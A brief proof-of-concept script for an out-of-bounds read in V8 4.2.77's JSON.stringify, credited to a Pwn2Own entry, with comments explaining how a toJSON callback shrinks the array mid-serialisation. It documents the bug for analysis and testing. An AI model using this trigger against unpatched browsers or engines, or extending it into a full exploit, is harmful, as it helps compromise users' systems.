// Credit: Guang Gong of Qihoo 360 via pwn2own 
// v8 version: 4.2.77, ia32
// flags: --expose_gc

var evil_array = [];
var evil_object = { 
  toJSON: function() {
      evil_array.length = 1;
      gc();
  }
};

for (var i=0; i<10; i++) evil_array[i] = 1;
evil_array[0] = evil_object;
JSON.stringify(evil_object);

/*
  toJSON -> JSON.stringify with FAST_ELEMENTS. OOB access

  Step 1. Array <- fast_elements (number)
  Step 2. define toJSON property, it will be used JSON.stringify.
  Step 3. Stringify --> SerializeJSArray
          length change but, hold obsolete length

    BasicJSONStringifier::SerializeJSArray()
      ...
      switch(object->GetElementsKind())
        ...
        case FAST_ELEMENTS:
          Handle<FixedArray> elements(FixedArray::cast(object->elements()), isolate_);
          for(uint32_t i=0; i<length; i++) {
            Results result = SerializeElement(isolate,
              Handle<Object> (elements->get(i), isolate_); // elements->get(i) will serialize OOB
          }
*/
